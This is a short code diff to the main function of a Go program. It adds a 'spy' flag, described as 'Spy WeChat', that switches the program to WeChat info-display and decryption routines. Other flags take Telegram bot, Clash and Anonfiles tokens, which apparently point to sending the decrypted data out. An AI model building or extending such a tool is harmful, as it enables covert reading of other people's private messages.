@@ -3,7 +3,7 @@
  * @Date: 2023-02-17 14:14:40
  * @version:
  * @LastEditors: SpenserCai
- * @LastEditTime: 2023-02-25 14:27:01
+ * @LastEditTime: 2023-03-03 10:27:37
  * @Description: file content
  */
 package main
@@ -20,6 +20,7 @@ func main() {
 	chatid := flag.Int("chatid", 0, "Telegram chat group id")
 	clashconn := flag.String("clashconn", "", "Clash connection string")
 	anontoken := flag.String("anontoken", "", "Anonfiles token")
+	spy := flag.Bool("spy", false, "Spy WeChat")
 	flag.Parse()
 	if *botoken != "" && *chatid != 0 {
 		TELBOT_TOKEN = *botoken
@@ -63,6 +64,12 @@ func main() {
 		fmt.Println("GetWeChatInfo error: ", err)
 		return
 	}
-	RunCommand()
+	if !*spy {
+		RunCommand()
+	} else {
+		ShowInfoCmd()
+		DecryptCmd()
+		fmt.Println("decrypt success")
+	}
 
 }
